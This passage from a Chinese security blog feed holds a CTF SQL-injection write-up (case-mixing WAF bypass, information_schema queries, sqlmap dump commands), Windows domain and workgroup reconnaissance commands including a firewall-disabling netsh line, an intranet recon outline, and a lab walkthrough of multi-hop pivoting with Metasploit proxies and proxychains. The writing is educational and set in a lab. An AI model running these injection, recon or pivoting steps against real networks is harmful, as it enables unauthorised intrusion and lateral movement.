<li>然后我们采用大小写绕过的方式，成功回显<br><img src="https://img-blog.csdnimg.cn/20210325162608918.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210325162617134.png" alt="在这里插入图片描述"></li>
<li>我们成功绕过WAF后，就可以正式展开攻击了。攻击的方式是将select 1中的1替换成我们想要查询的参数，这里我们替换成<code>group_concat(table_name) from information_schema.tables where table_schema=database()</code><br><img src="https://img-blog.csdnimg.cn/20210325162658776.png" alt="在这里插入图片描述"></li>
<li>执行成功后，可以看到所有的数据库名，fl4g和users<br><img src="https://img-blog.csdnimg.cn/20210325162719437.png" alt="在这里插入图片描述"></li>
<li>然后我们再进一步查询相应数据库的字段名，我们这里要查询的是fl4g这个数据库，查询语句为<code>sElEct group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;</code><br><img src="https://img-blog.csdnimg.cn/20210325162749320.png" alt="在这里插入图片描述"></li>
<li>最后查询语句替换为sElEct flag from fl4g，直接出flag值<br><img src="https://img-blog.csdnimg.cn/20210325162809150.png" alt="在这里插入图片描述"><h2 id="Sqlmap自动化注入"><a href="#Sqlmap自动化注入" class="headerlink" title="Sqlmap自动化注入"></a>Sqlmap自动化注入</h2></li>
<li>这里介绍第二种方式，使用sqlmap进行自动化注入的方式<br>首先我们用burpsuite神器进行抓包，将抓获的内容保存为request.txt文件<!--more-->
<img src="https://img-blog.csdnimg.cn/20210325162852232.png" alt="在这里插入图片描述"></li>
<li>然后键入如下命令<code>sqlmap -r request.txt --dbms=mysql</code>，然后判断出存在POST注入漏洞<br><img src="https://img-blog.csdnimg.cn/20210325162949388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>然后切换命令，爆破出数据库名称<code>sqlmap -r request.txt --dbs --dbms=mysql –batch</code>，这里我们的目标是note数据库<br><img src="https://img-blog.csdnimg.cn/2021032516301327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>然后指定数据库，爆出表名<code>sqlmap -r request.txt --dbs -D note --tables --dbms=mysql –batch</code><br><img src="https://img-blog.csdnimg.cn/20210325163031404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>然后爆出对应的字段名<code>sqlmap -r request.txt --dbs -D note -T fl4g --columns --dbms=mysql –batch</code><br><img src="https://img-blog.csdnimg.cn/20210325163051891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>最后爆破出flag值<code>sqlmap -r request.txt --dbs -D note -T fl4g -C flag --dbms=mysql --batch --dump</code><br><img src="https://img-blog.csdnimg.cn/20210325163109890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>Web漏洞攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>域内信息收集</title>
    <url>/2021/03/09/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在内网渗透中，我们必须要快速地对内网信息进行多方面的信息收集，因此我们需要用到一些常用的命令或者是工具对内网域控制器或者管理员进行快速地定位</p>
<h2 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h2><blockquote>
<p><strong>net config workstation：查询当前登录域及登录用户信息</strong></p>
</blockquote>
<p>“登录域”用于表示当前登录的用户是域用户还是本地用户</p>
<p><img src="https://img-blog.csdnimg.cn/20210309171809630.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>net time /domain：判断主域(域服务器通常会同时作为时间服务器使用)</strong></p>
</blockquote>
<p>执行命令后有三种情况，因为条件原因我这里只显示一种情况</p>
<p>存在域，但当前用户不是域用户<br>存在域，且当前用户是域用户<br><img src="https://img-blog.csdnimg.cn/20210309172224207.png" alt="在这里插入图片描述"><br>当前网络环境为工作组，不存在域</p>
<blockquote>
<p><strong>for /L %I in (3,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL=”：利用ICMP协议快速探测内网</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2021030917381328.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>net group /domain：查询域内所有用户组列表</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2021030917411554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>net group “domain computers” /domain：查询所有域成员计算机列表</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210309174225725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>net user /domain：向域控制器进行查询</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210309174445840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其中krbtgt用户不仅可以创建票据授权服务(TGS)的加密密钥，还可以实现多种域内权限持久化方法</p>
<blockquote>
<p><strong>wmic useraccount get /all：获取域内用户的详细信息，常见参数包括用户名、描述信息，SID，域名，状态等</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210309174625154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>dsquery user：查看存在的用户，目前发现只能在域控里使用这命令</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2021030917480369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>net group “domain admins” /domain：查询域管理员用户，这个命令非常非常重要！！！！</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210309174931906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>net group “Enterprise Admins” /domain：查询管理员用户组</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210309175032561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="更多学习资料请关注我的个人博客"><a href="#更多学习资料请关注我的个人博客" class="headerlink" title="更多学习资料请关注我的个人博客"></a>更多学习资料请关注我的个人博客</h2><p><a href="https://pyhsecurity.cn/">https://pyhsecurity.cn/</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>内网信息收集</title>
    <url>/2021/03/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="对当前机器角色判断"><a href="#对当前机器角色判断" class="headerlink" title="对当前机器角色判断"></a>对当前机器角色判断</h3><h3 id="对当前机器所处网络环境的拓扑结构进行分析和判断"><a href="#对当前机器所处网络环境的拓扑结构进行分析和判断" class="headerlink" title="对当前机器所处网络环境的拓扑结构进行分析和判断"></a>对当前机器所处网络环境的拓扑结构进行分析和判断</h3><h3 id="对当前机器所处区域的判断"><a href="#对当前机器所处区域的判断" class="headerlink" title="对当前机器所处区域的判断"></a>对当前机器所处区域的判断</h3><h2 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h2><h3 id="手动收集信息"><a href="#手动收集信息" class="headerlink" title="手动收集信息"></a>手动收集信息</h3><ul>
<li>进一步了解整个域的操作系统版本、软件及补丁安装情况、用户命名方式等</li>
</ul>
<h3 id="自动收集信息"><a href="#自动收集信息" class="headerlink" title="自动收集信息"></a>自动收集信息</h3><ul>
<li>通过WMIC命令行工具收集目标机器信息，通过导入ps1脚本</li>
</ul>
<h3 id="Empire下的主机信息收集"><a href="#Empire下的主机信息收集" class="headerlink" title="Empire下的主机信息收集"></a>Empire下的主机信息收集</h3><h2 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h2><h3 id="本地普通用户只能查询本机相关信息，不能查询域内信息，而本地管理员用户和域内用户可以查询域内信息。"><a href="#本地普通用户只能查询本机相关信息，不能查询域内信息，而本地管理员用户和域内用户可以查询域内信息。" class="headerlink" title="本地普通用户只能查询本机相关信息，不能查询域内信息，而本地管理员用户和域内用户可以查询域内信息。"></a>本地普通用户只能查询本机相关信息，不能查询域内信息，而本地管理员用户和域内用户可以查询域内信息。</h3><h3 id="原理：域内的所有查询都是通过域控制器实现的-LDAP协议-，而这个查询需要经过权限认证，当域用户执行查询命令时，会自动使用Kerberos协议进行认证。"><a href="#原理：域内的所有查询都是通过域控制器实现的-LDAP协议-，而这个查询需要经过权限认证，当域用户执行查询命令时，会自动使用Kerberos协议进行认证。" class="headerlink" title="原理：域内的所有查询都是通过域控制器实现的(LDAP协议)，而这个查询需要经过权限认证，当域用户执行查询命令时，会自动使用Kerberos协议进行认证。"></a>原理：域内的所有查询都是通过域控制器实现的(LDAP协议)，而这个查询需要经过权限认证，当域用户执行查询命令时，会自动使用Kerberos协议进行认证。</h3><h2 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h2><h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="利用NetBIOS探测内网"><a href="#利用NetBIOS探测内网" class="headerlink" title="利用NetBIOS探测内网"></a>利用NetBIOS探测内网</h3><ul>
<li>NetBIOS是局域网程序使用的一种应用程序编程接口，为程序提供了请求低级别服务的统一的命令集，为局域网提供了网络及其他特殊功能。NetBIOS的工作流程就是正常的机器名解析查询应答过程，因此推荐优先使用。</li>
</ul>
<h3 id="利用ICMP探测内网"><a href="#利用ICMP探测内网" class="headerlink" title="利用ICMP探测内网"></a>利用ICMP探测内网</h3><ul>
<li>对内网中每个IP地址执行ping命令，可快速找出内网所有存活的C段。</li>
</ul>
<h3 id="利用ARP探测内网"><a href="#利用ARP探测内网" class="headerlink" title="利用ARP探测内网"></a>利用ARP探测内网</h3><ul>
<li>ARP扫描最快，同时准确率也最高。</li>
</ul>
<h3 id="利用TCP-UDP端口探测内网"><a href="#利用TCP-UDP端口探测内网" class="headerlink" title="利用TCP/UDP端口探测内网"></a>利用TCP/UDP端口探测内网</h3><ul>
<li>ScanLine端口扫描工具</li>
</ul>
<h2 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h2><h3 id="利用telnet命令进行扫描"><a href="#利用telnet命令进行扫描" class="headerlink" title="利用telnet命令进行扫描"></a>利用telnet命令进行扫描</h3><ul>
<li>如果想快速探测某台主机的某个常规高位端口，使用telnet命令是最方便的。</li>
</ul>
<h3 id="S扫描器"><a href="#S扫描器" class="headerlink" title="S扫描器"></a>S扫描器</h3><ul>
<li>支持大网段扫描，特别适合运行在2003以下版本的操作系统中。</li>
</ul>
<h3 id="MSF端口扫描"><a href="#MSF端口扫描" class="headerlink" title="MSF端口扫描"></a>MSF端口扫描</h3><ul>
<li>大量的内置模块收集信息</li>
</ul>
<h3 id="PowerSploit的Invoke-portscan-ps1脚本"><a href="#PowerSploit的Invoke-portscan-ps1脚本" class="headerlink" title="PowerSploit的Invoke-portscan.ps1脚本"></a>PowerSploit的Invoke-portscan.ps1脚本</h3><h3 id="Nishang的Invoke-PortScan模块"><a href="#Nishang的Invoke-PortScan模块" class="headerlink" title="Nishang的Invoke-PortScan模块"></a>Nishang的Invoke-PortScan模块</h3><h3 id="端口Banner信息"><a href="#端口Banner信息" class="headerlink" title="端口Banner信息"></a>端口Banner信息</h3><ul>
<li>获取Banner信息后，可以在漏洞库中查找对应的CVE编号的POC、EXP，从而有针对性地进行安全加固。</li>
</ul>
<h2 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title="收集域内基础信息"></a>收集域内基础信息</h2><h3 id="确定了当前内网拥有的域，且所控制的主机在域内，就可以进行域内相关信息的收集了。"><a href="#确定了当前内网拥有的域，且所控制的主机在域内，就可以进行域内相关信息的收集了。" class="headerlink" title="确定了当前内网拥有的域，且所控制的主机在域内，就可以进行域内相关信息的收集了。"></a>确定了当前内网拥有的域，且所控制的主机在域内，就可以进行域内相关信息的收集了。</h3><h2 id="获取域内的用户和管理员信息"><a href="#获取域内的用户和管理员信息" class="headerlink" title="获取域内的用户和管理员信息"></a>获取域内的用户和管理员信息</h2><h3 id="查询所有域用户列表"><a href="#查询所有域用户列表" class="headerlink" title="查询所有域用户列表"></a>查询所有域用户列表</h3><h3 id="查询域管理员用户组"><a href="#查询域管理员用户组" class="headerlink" title="查询域管理员用户组"></a>查询域管理员用户组</h3><h2 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h2><h3 id="定位概述"><a href="#定位概述" class="headerlink" title="定位概述"></a>定位概述</h3><ul>
<li><p>在网络攻击测试中，获取域内一个支点后，需要获取管理员权限。当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限。也就是说系统会自动将域管理员组添加到本地系统管理员组中。</p>
</li>
<li><p>定位渠道</p>
<ul>
<li>日志和会话</li>
</ul>
</li>
</ul>
<h3 id="常用域管理员定位工具"><a href="#常用域管理员定位工具" class="headerlink" title="常用域管理员定位工具"></a>常用域管理员定位工具</h3><ul>
<li>psloggedon.exe</li>
<li>PVEFindADUser.exe</li>
<li>netsess.exe</li>
<li>hunter</li>
<li>NetView</li>
</ul>
<h2 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h2><h3 id="本机检查"><a href="#本机检查" class="headerlink" title="本机检查"></a>本机检查</h3><h3 id="查询域控制器的域用户会话"><a href="#查询域控制器的域用户会话" class="headerlink" title="查询域控制器的域用户会话"></a>查询域控制器的域用户会话</h3><ul>
<li>原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理会话的系统列表。</li>
</ul>
<h3 id="查询远程系统中运行的任务"><a href="#查询远程系统中运行的任务" class="headerlink" title="查询远程系统中运行的任务"></a>查询远程系统中运行的任务</h3><ul>
<li>条件是目标机器在域系统中是通过共享的本地管理员账户运行的</li>
</ul>
<h3 id="扫描远程系统的NetBIOS信息"><a href="#扫描远程系统的NetBIOS信息" class="headerlink" title="扫描远程系统的NetBIOS信息"></a>扫描远程系统的NetBIOS信息</h3><h2 id="利用PowerShell收集域内信息"><a href="#利用PowerShell收集域内信息" class="headerlink" title="利用PowerShell收集域内信息"></a>利用PowerShell收集域内信息</h2><h2 id="域内分析工具BloodHound"><a href="#域内分析工具BloodHound" class="headerlink" title="域内分析工具BloodHound"></a>域内分析工具BloodHound</h2><h2 id="敏感数据的防护"><a href="#敏感数据的防护" class="headerlink" title="敏感数据的防护"></a>敏感数据的防护</h2><h3 id="资料、数据、文件的定位流程"><a href="#资料、数据、文件的定位流程" class="headerlink" title="资料、数据、文件的定位流程"></a>资料、数据、文件的定位流程</h3><ul>
<li>定位内部人事组织结构</li>
<li>在内部人事组织结构中寻找需要监视的人员</li>
<li>定位相关人员的机器</li>
<li>监视相关人员存放文档的位置</li>
<li>列出存放文档的服务器的目录</li>
</ul>
<h3 id="核心业务机器及敏感信息防护"><a href="#核心业务机器及敏感信息防护" class="headerlink" title="核心业务机器及敏感信息防护"></a>核心业务机器及敏感信息防护</h3><ul>
<li>高级、系统管理人员，财务人员计算机</li>
<li>产品管理系统服务器</li>
<li>办公系统服务器</li>
<li>财务应用系统服务器</li>
<li>核心产品源码服务器</li>
<li>数据库服务器</li>
<li>文件、共享服务器</li>
<li>电子邮件服务器</li>
<li>网络监控系统服务器</li>
</ul>
<h3 id="应用于文件形式信息的防护"><a href="#应用于文件形式信息的防护" class="headerlink" title="应用于文件形式信息的防护"></a>应用于文件形式信息的防护</h3><ul>
<li>包括一些应用的配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等</li>
</ul>
<h2 id="分析域内网段划分情况及拓扑结构"><a href="#分析域内网段划分情况及拓扑结构" class="headerlink" title="分析域内网段划分情况及拓扑结构"></a>分析域内网段划分情况及拓扑结构</h2><h3 id="基础的Web架构"><a href="#基础的Web架构" class="headerlink" title="基础的Web架构"></a>基础的Web架构</h3><ul>
<li>ASP+Access+IIS 5.0/6.0+Windows Server 2003</li>
<li>ASPX+MSSQL+IIS 7.0/7.5+Windows Server 2008</li>
<li>PHP+MYSQL+IIS</li>
<li>PHP+MYSQL+Apache</li>
<li>PHP+MYSQL+Nginx</li>
<li>JSP+MYSQL+Nginx</li>
<li>JSP+MSSQL+Tomcat</li>
<li>JSP+Oracle+Tomcat</li>
</ul>
<h3 id="域内网段划分"><a href="#域内网段划分" class="headerlink" title="域内网段划分"></a>域内网段划分</h3><ul>
<li><p>DMZ</p>
<ul>
<li>这个区域不是严格意义上的内网，访问控制策略配置严格这内网能访问DMZ，DMZ不能访问外网</li>
</ul>
</li>
<li><p>办公区</p>
<ul>
<li>安全防护不高，一般攻击者会使用社会工程手段拿下这个网段</li>
</ul>
</li>
<li><p>核心区</p>
<ul>
<li>攻击者通过分析服务器上运行的服务和进程，可以推断出目标主机使用的运维监控管理系统和安全防护体系(横向移动优先找这些主机)</li>
</ul>
</li>
</ul>
<p><em>XMind - Trial Version</em></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>多层跳板攻击</title>
    <url>/2021/03/27/%E5%A4%9A%E5%B1%82%E8%B7%B3%E6%9D%BF%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先，我们在上一章的基础上，即在Windows Server2003的主机上又发现了另一层的网络，所以我们就必须在以win2003为跳板机，再去访问下一个网段的主机，即多层跳板攻击。<br><img src="https://img-blog.csdnimg.cn/20210327210912305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>我们这里使用一台Linux主机为另一个服务器，并设置一个新的网段来进行隔离，原理和上一章的差不多<br><img src="https://img-blog.csdnimg.cn/20210327205851533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>
<p><img src="https://img-blog.csdnimg.cn/20210327205912717.png" alt="在这里插入图片描述"><br>查看win2003时发现新的网段<br><img src="https://img-blog.csdnimg.cn/20210327210026616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们使用<code>arp_scan</code>模块扫描出更多的主机<br><img src="https://img-blog.csdnimg.cn/20210327210311904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>更新路由表并打印出来<br><img src="https://img-blog.csdnimg.cn/20210327210448179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<!--more-->
<p>然后我们再新开一个<code>socks4a</code>代理，并使用<code>jobs</code>命令查看任务，因为之前使用了1080这个端口，因此我们端口必须要重新设置一个新的<br><img src="https://img-blog.csdnimg.cn/20210327210638543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210327210651264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着我们使用相同的方法，使用<code>proxychains</code>对目标主机服务进行探测，首先我们得先配置proxychains配置文件<br><img src="https://img-blog.csdnimg.cn/20210327211730108.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210327210833369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现目标主机开放了22,80,139,445端口<br><img src="https://img-blog.csdnimg.cn/20210327211024186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们可以用之前章节使用的密码爆破的方法将主机的用户名和密码都爆破出来，因为我们这里使用的是<code>metasploitable2</code>靶机，默认用户名和密码是<code>msfadmin</code>，我们用proxychains登录其主机中<br><img src="https://img-blog.csdnimg.cn/20210327211353615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210327211430264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>从上面我们也发现目标主机开启了80端口服务，因此我们也能从网页的形式进一步渗透目标主机，但是浏览器上要设置相应的代理，因为目标网段本身不对外开放，这里我使用的是FoxyProxy这个浏览器代理插件<br><img src="https://img-blog.csdnimg.cn/20210327211938831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问成功<br><img src="https://img-blog.csdnimg.cn/20210327212023570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>现在我们对整个入侵思路进行一个总结。首先我们先使用kali攻击机，在本公司的防火墙上设置好NAT端口映射，目的是为了接受目标机反弹回来的shell，当我们对其中一台目标机①掌握了控制权后，我们在这台主机上发现了另一个网段(<code>104</code>网段吧)，然后我们以主机①为跳板机，去访问104网段，我们使用proxychains工具隐藏自己的真实访问IP，然后拿下主机②时，又发现另一个网段时，用相同的方法进行横向，多层跳板攻击的过程。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>工作组信息收集</title>
    <url>/2021/03/07/%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h2><p>不管是在外网还是内网中，信息收集都是重要的第一步。收集信息的方式又分为手动信息收集和自动信息收集。这里我们就先讲述怎样通过cmd命令手动收集内网中的主机信息。</p>
<h2 id="命令及演示效果"><a href="#命令及演示效果" class="headerlink" title="命令及演示效果"></a>命令及演示效果</h2><blockquote>
<p><strong>systeminfo | findstr /B /C:”OS 名称” /C:”OS 版本”</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307114353404.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>wmic product get name,version：利用wmic命令，将结果输出到文本文件中</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307121744649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>

<blockquote>
<p><strong>wmic process list brief：查看进程信息</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307121856592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>query user || qwinsta：查看当前在线用户</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307122040536.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>wmic qfe get Caption,Description,HotFixID,InstalledOn：查看补丁的名称、描述、ID、安装时间等信息</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307122228363.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>wmic share get name,path,status：查找共享列表</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307122530905.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>netsh advfirewall set allprofiles state off：关闭防火墙，2003之后的版本使用</strong></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210307122932307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210307122950503.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210307123003264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNzA3Mw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p><strong>reg query “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStation\RDP-Tcp” /V PortNumber：连接的端口是0xd3d，转换后为3389</strong></p>
</blockquote>
